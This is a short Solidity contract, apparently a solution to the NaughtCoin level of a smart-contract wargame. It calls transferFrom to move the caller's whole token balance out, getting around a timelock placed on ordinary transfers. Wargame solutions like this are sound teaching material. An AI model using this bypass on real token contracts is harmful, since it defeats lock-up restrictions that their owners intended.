// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract NaughtCoinAttack {
    IERC20 public target;

    constructor(address _target) {
        target = IERC20(_target);
    }

    function pwn() external {
        target.transferFrom(
            msg.sender,
            address(this),
            target.balanceOf(msg.sender)
        );
    }
}
